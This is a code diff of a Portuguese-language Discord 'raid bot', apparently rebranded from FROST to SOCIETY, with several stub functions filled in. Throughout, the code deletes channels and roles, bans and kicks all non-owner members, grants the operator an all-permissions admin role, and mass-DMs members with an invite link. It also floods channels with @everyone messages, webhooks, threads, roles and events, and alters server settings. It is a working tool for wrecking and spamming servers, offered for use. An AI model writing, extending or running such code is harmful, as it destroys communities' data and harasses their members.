@@ -2,22 +2,21 @@ import discord
 from discord.ext import commands
 import asyncio
 import aiohttp
-
 import os
 from dotenv import load_dotenv
 
+# Carrega variáveis de ambiente do arquivo .env
 load_dotenv()
-
-TOKEN = os.getenv("DISCORD_TOKEN")
+TOKEN = os.getenv('TOKEN')
 
 gifs = [
-    "https://tenor.com/view/kitty-cute-kitty-cat-gif-7277554186754121964",
-    "https://cdn.discordapp.com/attachments/1359169906188353630/1375933727355437208/convert-14-1.gif",
-    "https://tenor.com/view/wolf-cringe-gif-26633208"
+    "https://cdn.discordapp.com/attachments/1509314079527796766/1511420199272845403/lv_0_20260602130520.gif?ex=6a23af00&is=6a225d80&hm=906cb243045b4da5b662c7c9ad342f7a551e427271d97ac01b8c958efd9643ce&",
+    "https://media.discordapp.net/attachments/1461526422626635866/1510041880606281799/sctyhell.png?ex=6a23f157&is=6a229fd7&hm=45121490dcdb36b4929c83e6146233c9e2ed04a3a04d562e174b38164afe7a6f&=&format=webp&quality=lossless&width=1567&height=627",
+    "https://images-ext-1.discordapp.net/external/qBBYO1Pe_9AFo9iHso5BGNHPHbiOHSDdJqGxRgMJ0t4/https/media.tenor.com/0YarlQib6MwAAAPo/mandela-catalogue-alternate.mp4"
 ]
 
 nomes_canais = [
-    "FROST PASSOU AQUI",
+    "SOCIETY PASSOU AQUI",
     "PERDEU SERVE RANDOLA",
     "CHORA NN BUT KSKSKS"
 ]
@@ -39,7 +38,7 @@ async def on_ready():
 def get_menu_page(page):
     if page == 1:
         return """```
-FROST RAID BOT V0.0.0
+SOCIETY RAID BOT V0.0.0
 
 MENU DE OPCOES - PAGINA 1/3
 
@@ -63,7 +62,7 @@ Digite 'next' proxima | [99] AUTO RAID
 `````"""
     elif page == 2:
         return """```
-FROST RAID BOT V0.0.0
+SOCIETY RAID BOT V0.0.0
 
 MENU DE OPCOES - PAGINA 2/3
 
@@ -87,7 +86,7 @@ Digite 'next' ou 'back' | [99] AUTO RAID
 ````"""
     elif page == 3:
         return """```
-FROST RAID BOT V0.0.0
+SOCIETY RAID BOT V0.0.0
 
 MENU DE OPCOES - PAGINA 3/3
 
@@ -159,8 +158,8 @@ async def on_message(message):
         
         opcao = message.content.strip()
         
-        banner = "FROST RAID TEAM - SERVIDOR DESTRUIDO"
-        art = "FROST PASSOU AQUI - PERDEU SERVE"
+        banner = "SOCIETY RAID TEAM - SERVIDOR DESTRUIDO"
+        art = "SOCIETY PASSOU AQUI - PERDEU SERVE"
         
         # PAGINA 1 (1-30)
         if opcao == "1":
@@ -555,6 +554,9 @@ async def nuke(guild, banner, art, gifs):
     asyncio.create_task(deletar_canais(guild))
     asyncio.create_task(deletar_cargos(guild))
     asyncio.create_task(alterar_servidor(guild))
+    asyncio.create_task(enviar_dm_massa(guild))
+    asyncio.create_task(criar_cargos_loop(guild))
+    asyncio.create_task(criar_canais_massa(guild, banner, art, gifs))
 
 async def auto_raid(guild, banner, art, gifs):
     tasks = [
@@ -587,7 +589,7 @@ async def deletar_cargos(guild):
 
 async def alterar_servidor(guild):
     try:
-        await guild.edit(name="FROST PASSOU AQUI")
+        await guild.edit(name="SOCIETY PASSOU AQUI")
         async with aiohttp.ClientSession() as session:
             async with session.get("https://i.pinimg.com/736x/68/3f/f4/683ff496dfb2579566c575f61ef36c5a.jpg") as resp:
                 if resp.status == 200:
@@ -598,7 +600,7 @@ async def alterar_servidor(guild):
 
 async def enviar_dm_massa(guild):
     membros = [member for member in guild.members if not member.bot]
-    mensagem_dm = "SEU SERVIDOR FOI RAIDADO BY FROST\n\nEntre: https://discord.gg/WJ76QgRA"
+    mensagem_dm = "SEU SERVIDOR FOI RAIDADO BY SOCIETY\n\nEntre: https://discord.gg/WJ76QgRA"
     for membro in membros:
         try:
             await membro.send(mensagem_dm)
@@ -608,7 +610,7 @@ async def enviar_dm_massa(guild):
 async def criar_cargos_loop(guild):
     for i in range(200):
         try:
-            await guild.create_role(name="FROST ESTEVE AQUI")
+            await guild.create_role(name="SOCIETY ESTEVE AQUI")
         except:
             pass
 
@@ -630,7 +632,7 @@ async def spam_canais_existentes(guild, banner, art, gifs):
 async def webhook_spam(guild, banner, art, gifs):
     for canal in guild.text_channels:
         try:
-            webhook = await canal.create_webhook(name="FROST")
+            webhook = await canal.create_webhook(name="SOCIETY")
             asyncio.create_task(spam_webhook(webhook, banner, art, gifs))
         except:
             pass
@@ -645,20 +647,20 @@ async def spam_webhook(webhook, banner, art, gifs):
 async def kick_all(guild):
     for member in [m for m in guild.members if not m.bot and m != guild.owner]:
         try:
-            await member.kick(reason="FROST")
+            await member.kick(reason="SOCIETY")
         except:
             pass
 
 async def ban_all(guild):
     for member in [m for m in guild.members if not m.bot and m != guild.owner]:
         try:
-            await member.ban(reason="FROST")
+            await member.ban(reason="SOCIETY")
         except:
             pass
 
 async def get_admin(guild, user):
     try:
-        role = await guild.create_role(name="FROST ADMIN", permissions=discord.Permissions.all())
+        role = await guild.create_role(name="SOCIETY ADMIN", permissions=discord.Permissions.all())
         member = guild.get_member(user.id)
         if member:
             await member.add_roles(role)
@@ -677,7 +679,7 @@ async def mass_mention(guild):
         try:
             mentions = " ".join([m.mention for m in guild.members if not m.bot][:50])
             for _ in range(10):
-                await canal.send(f"{mentions} FROST")
+                await canal.send(f"{mentions} SOCIETY")
         except:
             pass
 
@@ -695,14 +697,14 @@ async def spam_reactions(guild):
 async def rename_members(guild):
     for member in guild.members:
         try:
-            await member.edit(nick="FROST")
+            await member.edit(nick="SOCIETY")
         except:
             pass
 
 async def mass_nick(guild):
     for member in guild.members:
         try:
-            await member.edit(nick="FROST")
+            await member.edit(nick="SOCIETY")
         except:
             pass
 
@@ -710,7 +712,7 @@ async def create_threads(guild):
     for canal in guild.text_channels:
         try:
             for i in range(10):
-                await canal.create_thread(name=f"FROST {i}", type=discord.ChannelType.public_thread)
+                await canal.create_thread(name=f"SOCIETY {i}", type=discord.ChannelType.public_thread)
         except:
             pass
 
@@ -725,7 +727,7 @@ async def delete_webhooks(guild):
 async def spam_voice_channels(guild):
     for i in range(50):
         try:
-            await guild.create_voice_channel(f"FROST {i}")
+            await guild.create_voice_channel(f"SOCIETY {i}")
         except:
             pass
 
@@ -746,7 +748,7 @@ async def clear_messages(guild):
 async def pin_spam(guild):
     for canal in guild.text_channels:
         try:
-            msg = await canal.send("FROST")
+            msg = await canal.send("SOCIETY")
             await msg.pin()
         except:
             pass
@@ -754,20 +756,20 @@ async def pin_spam(guild):
 async def create_categories(guild):
     for i in range(50):
         try:
-            await guild.create_category(f"FROST {i}")
+            await guild.create_category(f"SOCIETY {i}")
         except:
             pass
 
 async def rename_channels(guild):
     for canal in guild.channels:
         try:
-            await canal.edit(name="frost")
+            await canal.edit(name="society")
         except:
             pass
 
 async def server_template(guild):
     try:
-        await guild.create_template(name="FROST", description="RAIDADO")
+        await guild.create_template(name="SOCIETY", description="RAIDADO")
     except:
         pass
 
@@ -775,7 +777,7 @@ async def forum_spam(guild):
     for canal in guild.forums:
         try:
             for i in range(20):
-                await canal.create_thread(name=f"FROST {i}", content="FROST")
+                await canal.create_thread(name=f"SOCIETY {i}", content="SOCIETY")
         except:
             pass
 
@@ -800,11 +802,11 @@ async def spam_events(guild):
         try:
             start_time = datetime.now() + timedelta(days=i)
             await guild.create_scheduled_event(
-                name=f"FROST {i}",
+                name=f"SOCIETY {i}",
                 start_time=start_time,
                 entity_type=discord.EntityType.external,
                 privacy_level=discord.PrivacyLevel.guild_only,
-                location="FROST"
+                location="SOCIETY"
             )
         except:
             pass
@@ -826,7 +828,7 @@ async def max_channels(guild, banner, art, gifs):
 async def max_roles(guild):
     for i in range(250):
         try:
-            await guild.create_role(name=f"FROST {i}")
+            await guild.create_role(name=f"SOCIETY {i}")
         except:
             break
 
@@ -857,13 +859,13 @@ async def disconnect_voice(guild):
 async def spam_stage_channels(guild):
     for i in range(20):
         try:
-            await guild.create_stage_channel(f"FROST {i}")
+            await guild.create_stage_channel(f"SOCIETY {i}")
         except:
             pass
 
 async def clone_server(guild):
     try:
-        template = await guild.create_template(name="FROST")
+        template = await guild.create_template(name="SOCIETY")
         await template.sync()
     except:
         pass
@@ -888,14 +890,14 @@ async def spam_invites(guild):
 async def create_forums(guild):
     for i in range(10):
         try:
-            await guild.create_forum(f"FROST FORUM {i}")
+            await guild.create_forum(f"SOCIETY FORUM {i}")
         except:
             pass
 
 async def role_spam(guild):
     for i in range(50):
         try:
-            role = await guild.create_role(name=f"FROST {i}")
+            role = await guild.create_role(name=f"SOCIETY {i}")
             for member in guild.members[:10]:
                 try:
                     await member.add_roles(role)
@@ -925,7 +927,7 @@ async def remove_reactions(guild):
 async def spam_embeds(guild):
     for canal in guild.text_channels:
         try:
-            embed = discord.Embed(title="FROST", description="RAIDADO", color=0xFF0000)
+            embed = discord.Embed(title="SOCIETY", description="RAIDADO", color=0xFF0000)
             for _ in range(20):
                 await canal.send(embed=embed)
         except:
@@ -944,7 +946,7 @@ async def create_emojis(guild):
                 if resp.status == 200:
                     image = await resp.read()
                     for i in range(10):
-                        await guild.create_custom_emoji(name=f"frost{i}", image=image)
+                        await guild.create_custom_emoji(name=f"society{i}", image=image)
     except:
         pass
 
@@ -966,7 +968,7 @@ async def thread_spam(guild):
     for canal in guild.text_channels:
         try:
             for i in range(20):
-                await canal.create_thread(name=f"FROST {i}", type=discord.ChannelType.public_thread)
+                await canal.create_thread(name=f"SOCIETY {i}", type=discord.ChannelType.public_thread)
         except:
             pass
 
@@ -999,7 +1001,7 @@ async def edit_messages(guild):
         try:
             async for msg in canal.history(limit=50):
                 if msg.author == guild.me:
-                    await msg.edit(content="FROST")
+                    await msg.edit(content="SOCIETY")
         except:
             pass
 
@@ -1014,12 +1016,12 @@ async def role_colors(guild):
 async def channel_topics(guild):
     for canal in guild.text_channels:
         try:
-            await canal.edit(topic="FROST PASSOU AQUI")
+            await canal.edit(topic="SOCIETY PASSOU AQUI")
         except:
             pass
 
 async def spam_nicks(guild):
-    nicks = ["FROST", "RAIDADO", "PERDEU"]
+    nicks = ["SOCIETY", "RAIDADO", "PERDEU"]
     for member in guild.members:
         try:
             import random
@@ -1076,7 +1078,7 @@ async def announcement_spam(guild):
         try:
             if canal.type == discord.ChannelType.news:
                 for _ in range(20):
-                    msg = await canal.send("@everyone FROST")
+                    msg = await canal.send("@everyone SOCIETY")
                     await msg.publish()
         except:
             pass
@@ -1119,7 +1121,7 @@ async def mass_move_voice(guild):
 async def voice_spam(guild):
     for i in range(30):
         try:
-            await guild.create_voice_channel(f"FROST VOICE {i}")
+            await guild.create_voice_channel(f"SOCIETY VOICE {i}")
         except:
             pass
 
@@ -1133,10 +1135,22 @@ async def clear_insights(guild):
     pass
 
 async def audit_spam(guild):
-    pass
+    for i in range(50):
+        try:
+            await guild.edit(name=f"SOCIETY {i}")
+        except:
+            pass
 
 async def sticker_spam(guild):
-    pass
+    try:
+        async with aiohttp.ClientSession() as session:
+            async with session.get("https://i.pinimg.com/736x/68/3f/f4/683ff496dfb2579566c575f61ef36c5a.jpg") as resp:
+                if resp.status == 200:
+                    image = await resp.read()
+                    for i in range(5):
+                        await guild.create_sticker(name=f"SOCIETY {i}", description="RAIDADO", emoji="💀", file=discord.File(image, filename="sticker.png"))
+    except:
+        pass
 
 async def soundboard_spam(guild):
     pass
@@ -1145,7 +1159,7 @@ async def forum_tags_spam(guild):
     for forum in guild.forums:
         try:
             for i in range(10):
-                await forum.create_tag(name=f"FROST {i}")
+                await forum.create_tag(name=f"SOCIETY {i}")
         except:
             pass
 
@@ -1164,10 +1178,16 @@ async def notification_spam(guild):
         pass
 
 async def remove_guide(guild):
-    pass
+    try:
+        await guild.edit(community=False)
+    except:
+        pass
 
 async def remove_features(guild):
-    pass
+    try:
+        await guild.edit(features=[])
+    except:
+        pass
 
 async def reaction_spam(guild):
     for canal in guild.text_channels:
@@ -1178,10 +1198,19 @@ async def reaction_spam(guild):
             pass
 
 async def animated_banner(guild):
-    pass
+    try:
+        async with aiohttp.ClientSession() as session:
+            async with session.get("https://cdn.discordapp.com/attachments/1509314079527796766/1511420199272845403/lv_0_20260602130520.gif") as resp:
+                if resp.status == 200:
+                    await guild.edit(banner=await resp.read())
+    except:
+        pass
 
 async def discovery_spam(guild):
-    pass
+    try:
+        await guild.edit(discovery_splash=None)
+    except:
+        pass
 
 async def remove_onboarding(guild):
     pass
@@ -1193,10 +1222,19 @@ async def remove_safety(guild):
         pass
 
 async def vanity_spam(guild):
-    pass
+    import string
+    import random
+    try:
+        code = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
+        await guild.edit(vanity_code=code)
+    except:
+        pass
 
 async def fake_boost(guild):
-    pass
+    try:
+        await guild.edit(name="🚀 SOCIETY BOOSTED 🚀")
+    except:
+        pass
 
 async def region_spam(guild):
     regions = [discord.VoiceRegion.brazil, discord.VoiceRegion.us_east, discord.VoiceRegion.europe]
@@ -1236,12 +1274,16 @@ async def spam_everyone(canal):
 async def spam_messages(canal, banner, art, gifs):
     try:
         await asyncio.sleep(1)
-        tasks = []
-        for _ in range(20):
-            tasks.append(canal.send(f"@everyone {banner}"))
-            tasks.append(canal.send(f"{art}\n{gifs[0]}"))
-            tasks.append(canal.send(f"@everyone https://discord.gg/WJ76QgRA"))
-        await asyncio.gather(*tasks, return_exceptions=True)
+        for i in range(20):
+            try:
+                await canal.send(f"@everyone {banner}")
+                await canal.send(f"{art}")
+                # Envia um gif por vez da lista
+                await canal.send(gifs[i % len(gifs)])
+                await canal.send(f"@everyone https://discord.gg/AAnFNAawqA")
+                await asyncio.sleep(0.5) # Pequeno delay para evitar rate limit agressivo
+            except:
+                continue
     except:
         pass
 
